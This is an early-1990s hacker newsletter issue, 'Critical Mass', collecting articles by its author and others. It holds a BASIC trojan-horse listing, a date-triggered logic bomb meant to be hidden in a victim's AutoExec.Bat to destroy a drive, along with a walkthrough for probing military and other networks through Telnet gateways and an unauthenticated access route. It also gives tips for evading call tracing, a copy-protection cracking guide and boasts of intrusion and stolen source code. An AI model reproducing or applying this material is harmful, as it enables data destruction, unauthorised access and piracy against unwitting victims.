         We as you may (or your REALLY stupid people) may not know, the US is
at war. You may or may not have people you know fighting over there, so we 
here in the hacking realm decided to put our part for you. If you have friends
or love ones there, you can send them mail faster than anyone you know know.
While hacking on a VAX I broke into, I got a hold of a message from east
Florida and it states that GE is allowing the use of there network to send
messages to loves one at war. You must supply some information though. Like
the following......

Name and Rank
Social Security Number
Unit or Ship

         If you don't supply this information correctly, it will be sent to
the wrong person. What happens is that you send a message, it is then put
into envolopes and sealed. After that it is given to the person you desire.
It is a hell of alot fast than standard US mail! Just call.......

(904)668-7610

         ......and supply the information given. At the 'U#' prompt, just
press return. If you don't like the war, please don't send out anti-war
shit. Its bad enough that they have to be there without your shit.

   
         On a lighter subject, heres a little information named 'Dungeon 
Master' gave me, that I SHOULD have known a LONG time ago. All you wargamers
out there will be happy to here that the call tracing or the redial last
number features or NOT avalible for the following prefixxes and exchanges in
the TLH area!!!!!!!!!!

421
488, 487
893-0000 thru 893-6999
893-9100's thru 668-12XX

         You don't beleive me? Look on page 11 in the white pages! Also, there
are a few things that happens in call tracing, you must understand. When a
call is sucessfully traced, the fone company doesn't give the number to you
but rather the law enforcement agency handles the task for you. 
         On another subject, in Critical Mass#2, I talk about hacking InterAct.
All that information should be disregarded. The system was taken down. You
didn't miss much. It was running on a IBM3090 series. 
         Included with this text is some code that is (or should I say was)
'confidental'. It is 'C' code and I figured some of you may be intrested to
see exactly how UNIX works. This is part of the inner making. Download if
you please and have intrest. It is under the name 'Criticalinfo.txt'. I won't
tell what system it came from! Have fun and happy hacking to ya!

     This is the premier of a new section in Critical Mass called
"Using Basic in Trojan Horses"... I will basically will be giving you some
basic source code, and explaining how it works... Well let's get started with a
simple little program that will destroy whatever disk it is located on if the
date is equal or later than the one you specified.


10 CLS
20 CLOSE #1:CLOSE #2
30 KEY OFF
40 MONTH$=LEFT$(DATE$,2)   'This gets the current Month
50 DAY$=MID$(DATE$,4,2)    'This gets the current Date
60 YEAR$=RIGHT$(DATE$,2)   'This gets the current Year
70 MONTH=VAL(MONTH$)       'This changes Month$ to Month
80 DAY=VAL(DAY$)           'This changes Day$ to Day
90 YEAR = VAL(YEAR$)       'This changes Year$ to Year
100 NEWDATE$="01/01/92"    'You change this to any date you
                           ' want to ...
110 NEWMONTH$=LEFT$(NEWDATE$,2) 'Gets the Month to check
120 NEWDAY$=MID$(NEWDATE$,4,2) 'Gets the Day to check
130 NEWYEAR$=RIGHT$(NEWDATE$,2) 'Gets the year to check
140 NEWMONTH=VAL(NEWMONTH$) 'Changes NewMonth$ to NewMonth
150 NEWDAY=VAL(NEWDAY$)     'Changes NewDay$ to NewDay
160 NEWYEAR=VAL(NEWYEAR$)   ' Changes NewYear$ to NewYear
170 IF MONTH >NEWMONTH AND YEAR >=NEWYEAR THEN GOTO 210
180 IF MONTH = NEWMONTH AND DAY=>NEWDAY AND YEAR = NEWYEAR THEN GOTO 210
190 IF YEAR > NEWYEAR THEN GOTO 210
200 END
210 SHELL "CD >FAKE.DAT" 'Places current sub directory in a 'file
220 OPEN "FAKE.DAT" FOR INPUT AS #1 'Opens file for use
230 LINE INPUT #1, DRIVE$ 'Gets then Directory you are in
240 DRIVE$=LEFT$(DRIVE$,2) 'Finds the Drive currently on
250 IF DRIVE$=UCASE$(DRIVE$)
260 IF DRIVE$="A:" THEN SHELL"REN X001.BIN KILLA.COM": SHELL"KILLA.COM"
270 IF DRIVE$="B:" THEN SHELL REN X002.BIN KILLB.COM": SHELL"KILLB.COM"
280 IF DRIVE$="C:" THEN SHELL REN X003.BIN KILLC.COM": SHELL"KILLC.COM"
290 IF DRIVE$="D:" THEN SHELL REN X004.BIN KILLD.COM": SHELL"KILLD.COM"
300 IF DRIVE$="E:" THEN SHELL REN X005.BIN KILLE.COM": SHELL"KILLE.COM"
310 END


    Basically all this piece of code does is it will check the current date of
the system, and if the date is after or on the date you specify, it will
destroy whichever drive it is being run from... So you could add this to
someone's "AutoExec.Bat" file, and when the date matches or is after the one
you specify, it will destroy the drive it is being run from... For this to run
correctly, you must use the information in Critical Mass issue #1, and compile
the ".COM" files needed to destroy each of the above disks... Then rename them
to the appropriate file name...
    For this program to run correctly, you need to compile it, so it will run
directly from DOS... If you do not have a Basic Compiler then you will need to
run it with the command "Basica DateChek.Bas", and change line 310 to "SYSTEM".
    The next issue of this text will contain a text file with a source code on
using command line attributes in basic, and how to add them to this program...

           This is the first of a series of articles that will pretain to
the hacking of 'Internet'. Yes, this is the same network that a worm hit in
1987. Actually, this artical will talk more along the lines of hacking the
Telnet systems, which in turn, you can get to other networks like ARPAnet
and CHAOSnet, and much more. First off, I would like to go into finding 
a Telnet you can use. On VAX's under VMS, there is usually a service called
'TELNET'. This is you gateway to the internet and other networks. Usually, 
these networks go to everything from White Sands Missle Range to Small 
colleges. Sense most Telnet gateways are only accessable off VAX's (or at
least around here)


         Ok, first off, lets say you have a access to the Telnet gateway,
it does you no good if you have nowhere to goto! If you ask for help most
of the time, you will get very little. First, I have noted two different 
Telnet access software types. One looks like this (Off of only VAX's that I
have seen so far.....)


TELNET>

        The Other......

Telnet>

          I know, this appears to be no big deal, but the first on operates
a little different (The one on VAX's). For one this, the help menu is a 
hell of alot better and more detailed. The secound, I have only seen off of
networks, and not in VAX's. Besides the help differences, they operate a little
different two. You see, to connect to another computer though telnet, you must
give it a address. On a VAX (the first one), you would simply type the address
itself..... For example, the address is 'I.LOVE.TO.HACK'. You would do this...

TELNET> I.LOVE.TO.HACK
Trying....... (This is a message telling you it is attempting to connect to
               the remote system)

           On the other it would be.....

Telnet> o I.LOVE.TO.HACK

          The 'o' stands for 'open' a address. Simple enough, lets move on.
Now the information I have given you does you no good so far, if you have no
addresses. Heres how to get TONS of address........ We will use the telnet
though a VAX to make it simple (just keep in mind what I said above). The
address is 'NIC.DDN.MIL'. The 'DDN' stands for Defense Dept. Network, and 
the 'MIL'. Sure you can guess. Don't worry, this system is non-classified
and can be accessed 'anonymously', meaning in this case, no password or 
username is required. The system is running on a DEC2060 on TOPS-20, for you
more experianced hackers out there..... So you would type......

TELNET>NIC.DDN.MIL
Trying........ Connected to (Blah, blah, blah)

          You will then be connected to the system in Washington, I beieve,
Im not sure. On this system, you can read bulletins about security on the 
internet, and often get a few pointers on hacking! (This would be the first
option on the menu, or 'NIC'<CR>. Lets go on though with the article though. 
Do read it though. It is VERY intresting at times. Now you have one address.
With this address you can get tons but typing this at the '@' prompt.


WHOIS (What ever you what to get a address to, for example)

WHOIS WHITE <CR>

           When you type this though, you have to wait a LLOOONNGG time for
it to put up all things about 'white'. It will not only pull up addresses,
but in many cases, network uses also! Names, fone numbers and all! One of
the first thing it will pull is 'White sands missle range' the last thing it
will get is a 'Wyoma E. Smith', or a netuser. Some users work form the 
pentagon, other Eglins Air Force Base. Now most of these systems are non-
classified, but from what I understand, it is possible to find classifed 
systems also. The odds that you could break into a classified, or even find
one is about null. Now after 5 to 10 min of searching its database, it will
give a BIG list (Im not kidding about the time). Here is a example line.......


U.S Air Force (APDS-II-OSO33)  APDS-II-OSO33.AF.MIL             26.6.0.66

      ^             ^                  ^                            ^
      l             l                  l                            l

    Name         Handle             Address                      Address
                                (Usually Internet)

     1.            2.                 3.                            4.

     


         Worry only about the name and addresses, for now. Now this is a 
good example, but most of the time it is a little easier to read that this.
After we got all the addresses we wanted, we would then leave NIC.DDN.MIL
by typing 'quit'. From there we would goto the 'TELNET>' prompt again. Now
lets say we want to connect the system above, we would try to determine what
the addresses is. No at number 3, note the '-' in the name. These will not 
work on internet. So we look at the last dash and copy everything too the 
right, or 'OSO33.AF.MIL'. Odds are this address will work fine at the telnet
prompt. So to connect to this system, you would type....... 

TELNET>OSO33.AF.MIL <CR>
Trying....... 

         Now one of few things might happen. You might get 'Trying.....Unable
To Connect To Remote Host In Time Out Period', or something like that. This
is not bad, try is again a few times. If it doesn't connect, either the system
is down, the line is bad, or just wants no one from your area to connect to
that system, which I doubt ever happens. Just try again at a later time.
If it says 'Internet host unknown', we go back up too the example above.
         Look at number 4. Try that at the telnet. If you get the same 
you might have trouble accessing that system. You type that in just as it 
appears. Most of the addresses I and Shadow have found connect to SUN's. 
They seem to like them a bunch. This should cover the basics of hacking 
internet. For you people that use 'internet' on a VAX, there is sometimes a
'anonymous' list for internet. It will give you addresses to systems that 
you can connect to and type at the username prompt 'guest' and the password
'anonymous', usually. GET IT! It is VERY handy! Also, Another way to get 
addresses off a VAX without going though TELNET, is at your VMS prompt, 
type 'whois (ya no what goes here)'. If it has telnet abilities, you will 
get a list. This doesn't work from a network telnet, only on VAX telnet's.
Now I am going to tell you something that some hackers in TLH area might 
not like (mostly my brothers in the SAOO). Heres how YOU can access telnet
and hack on it. No password or username is required. I take it will all 
know how to use FIRN and UFnet (refer to CM#1 and 2). Do this at the UFnet
'#' prompt. Type either 

call 200
  or 
call 202

          Which every you prefer. Now connect to 'ds2100', like thus.....

Local> c ds2100 <CR)

         You will connect to Telnet, and the rest (getting addresses, and
such) is up too YOU. I have told you how to do it so it should be no problem.
This telnet operates like the secound example given about the differences in
telnets. In you have any questions about part on, you know where too e-mail
me. On Warriers Reteat or The Reactor BBS. Also, Shadow, as usual, has 
played a great role in the hacking of this network. Thanx again........ Part
two will go into more VAX stuff, one topic I no that will be discussed will
be 'who to get usernames and passwords of internet uses, using the intruder
log file you YOUR advantage as a trojan horse!'. Don't miss it. Im sure you
won't! Till then, Chow

     Due to the loss of the original artical, I will now re-type it (to the
best of my non-static memory).  The good part is that now I can add a second 
part to the artical covering the basics of using a sector and format editor.

    The machine of choice is a Commodore 64.  This artical makes no attempt
to present it's self as a full and complete guide to cracking, I will, 
however, give you the title of a book that makes a great refrence work. 
The title:  Inside Commodore DOS  The authors: Richard Immers, Ph.D. and 
Gerald G. Newfeld, Ph.D.  If you own a 1541 and not this book; buy the book!

Copy protection:

    Their are three popular methods of copy protection.  One, embeded errors;
two, data encription; and three, manual protection.  The first two methods are
somewhat simple to overcome, the third however, does present problems.  We 
will cover these methods one at a time and in order.  However, first their are
definitions to be made:

         One, Embeded Errors:

              This one is the easiest to defeat, all one has to do is come
              up with a comptent nibler (bit copier) and cut it loose.  This
              should make a functional copy.  The method behind the madness
              of loading down a disk with errors is that earlier in the 
              strugle between pirates and developers, the developers belived
              that pirates would not be able to easly copy these errors and
              become discuraged.  The pirates rose to the ocation and came
              up with the bit coping system.  They also came up with the idea
              of paramaters for these bit copiers.  A parementer is a map of
              errors that a nibbler uses when it copies a disk.

         Two, Data Encription:

              This one also has advantages and was the next step in the 
              battle.  It uses such techniques as half-tracks, checksums,
              and encodeing.  It is at it's best when coupled with manual
              protection, otherwise it has little valule.

         Three, Manual protection:

              This one ranges from hard to easy and all points between.  
              Manual protection's ease of overcome is directly realted to
              either if it is coupled with data encription or it's actual 
              position on the disk.  I'll explain.  If the data base the 
              program uses for valadation is part of the same program that 
              actualy does the vadalation then the job is much easier.
              (See below for reasons)

         Steps to cracking preperation:

         First:

              Scan the disk for errors.  If errors are there, make a nibble
         copy and run the copy.  Make sure that it behaves exactly like the
         original.  If it doesn't then go back and figure out why.  This may
         be done by making an error map of the original and comparing it to
         the errors present on the copy.  If they are the same, then you have
         a valid copy.  With this copy, the sysem should work.  Keep in mind,
         if your equipment can run this softwear then your system can 
         duplicate it.  If your system can read the stuff, then it can WRITE
         it!
              If their are no errors, STILL make a nibble copy!  Better safe 
         than sorry.

         Second:

              Establish the order of execution of the programs within the 
         softwear and see if you can figure out just how the softwear is 
         protected.  A good rule of thumb here is:  If your drive does a lot
         of thrashing and head banging then it is most likely error protected.
         If the system is manual protected, then this will be quite apparent.
         It'll ask for mabey a number on a wheel or some symbols or "What-is-
         on-line-xx-of-page-xx?"...

         Third:

              Overcoming softwear protection is DIRECTLY related to the
         method of protection used.  Not only this, but just how the 
         method(s) are interelated.  An example:  A peice of softwear might
         be error protected AND manual protected WHERE the keywords are 
         ENCODED!!  Needless to say, this configuration would suck to the
         extreme. 

         Now for the good stuff...

         Cracking the wearz:

         Protection                    Method of defeat
         ====================          ========================================
         Error protection              A good solid nibble copier
         Encription                    Also a good nibbler
         Manual protection             Now it gets tricky...


         Straight manual protection:

         In manual protection you must search for a keyword.  This would be 
         a responce that you know to be one of the answers to the verification
         prompts.  If you have no search function, you will have to chain
         thru all the programs, in the order that they are loaded, until you 
         find the table of keywords.
         When you find the words used, you change them all to a single word or
         character string (such as dec 13 (hex 0C) for return) and try it.  
         If it doesn't work, this could mean that it has a checksum.  A
         checksum is a number that is the sum of all the characters added.  If
         this number doesn't check out with the data present... CRASH!
         To overcome a checksum one can do one of two things.  First, find an
         entreable character or string of characters that add up to the
         checksum or change the checksum to your preference.  The first is the
         easiest.

         Encoded manual protection:

         One must keep in mind that the keywords MUST be entreable from the 
         keyboard.  If it wern't then the prot. scheme would not be feasable.
         the entrable keys fall between asc 32 and asc 128.  Then the fun 
         begins.  You must determin the method of encription (ie. crack the 
         code).  This is the next to the most dificult thing to do.

         Last ditch effort:

         If you can't undermine the copy protection scheme in any of the above
         indirect methods, their is one last thing that can be done.  This is
         to load the system, disassimble it, and redirect the program around
         the security check aeras.  This is THE *MOST* dificult method, but
         it is the best and absulitly sure to work if you can do it.

    In closing, I hope that you find this useful.  If there are any questions,
comments, complaints or mistakes feel free to contact me.  As above, I may be

Appendix A:  An overview (Of disk Operation)

    A disk works like a tape recorder.  In fact, a disk is made of the same
materal.  The bonous, ofcorce, is speed of access.  Sence the sucker spins 
(usualy at about 300rpm [5.25" Floppy] and the read/write head moves it can 
locate and read information quickly and effecniently.
    Now, the disk structure is made up of tracks and sectors.  A track is a
circular band that streches around the disk's surface.  Sectors are small 
segments that make up tracks.  Now if you look at a disk, you can't tracks or
sectors.  This is beacuse that these structures are made up of microscopic 
magnetic filiments.  The orentation of their poles denote whether the bit that
it represents is 1 or 0 (that is on or off).

Note on double sided drives:

    A double sided drive is much like a single sided one.  The difrence is 
ofcorse the manor in whitch it accesses the drive.  A double sided drive has
two read/write heads one above eachother.  It both sides of the disk at the
same time.  Observe:             

Single sided drive:                   Read/Write head
                                     /
                       |||||------===               
                             ---------------------- <- Disk

Double sided drive:                   Read/Write head
                                     /
                       |||||------===               
                             ---------------------- <- Disk        
                       |||||------===
                                     \
                                      Read/Write head

    This (for a double sided drive) means that their is a a new structure:
The cylender.  A cyndler is a set of tracks that occur one above eachother.
This allows both more disk space and faser access.

    Now, their is only one thing that remains.  As a rule, a disk will write
data to sectors that are about 10 sectors distant.  This is done for speed.

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
Appendix B:  Sector Editors

    Basicly all sector editors will read a sector as a chunk of data, and 
allow you to edit it.  Mostly they will allow editing in either HEX or DEC
format.  After editing, it will allow you to write it back to the disk
    When you get your sector editor, you should practice with it on a test
disk.  The reason is that a sector editor bypasses all safty functions within
a drive's operating system, and you could wipe out a program's data.
    When possible, it is best to get a sector editor with capabilities to 
generate errors.
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
Appendix C:  Format Editors

    A format editor is a system whitch can generate errors for a full track. 
They are also cabeable of changeing critical header information and disk 
checksums.  Best to find one that is intergrated with a sector editor and 
possibly a copy system.  I use (for my C64) either Di-sector3.0 or Renegade2.0
These are good solid systems.  If you have a better version of either of 
these systems for a Commodore 64, please tell me.

Subject: GRIND 2.0



The Beaver,
               I must say that the people for whom I speak will never be the
same... What happened to Grind 2.0! Alas have you forgotten the mighty few
who have fought long and hard to keep such a valiant hobby alive... We the
few the proud shall regret the day that you hath taken such a powerful and
mighty tool from us... By the way... U-load the other Hack software you have
to here... I know this letter sounds like it is from the 11th century, but
is it funny or what!
                               XXXXXXXXXXX


               Well, GRIND 2.0 (or The IBM Home Destruction Kit) is moving
right along. It is a VERY large task, so it is going to take longer than I
had really planed on! Actually, there will be no IBM.H.D.K, but rather 'The
Advanced Hacker ToolBox'. It is the merge of two programs. They are 'The SC/HA
Hacker ToolBox' and 'The IBM Home Destruction Kit'. Here is a few things it
will included when done..........

1>   Terminal
2>   ASCII Capture and Xmodem Tranfering
3>   Long Distance Carrier Code Finder!!!!
4>   Rapid Fire (Command and buff overloading, for those OLD systems)
5>   Key scan (For those systems that don't respond to anything)
6>   Dbase Hacker (With 470+ popular passwords!)
7>   Online Trojan Kit!!!!!!
8>   WarGame Dialer
9>   And about a million other things!


               So just keep you eyes peeled, you will see it soon, I hope. With
many more versions to come too!

          Ahhhhh, well onec again, it appears that we have come to the close
of yet another issue of Critical Mass. I have been amazed at the response that
I have gotten from Tallahassee area hackers and there support. Thanks a bunch!
Still, I do get the usual insult, and I even had one guy tell me not to write
another CM issue, or I would pay. Well heres to you IN YOUR FACE! Please though
keep the insults comming, it makes BBSing a little more intresting!
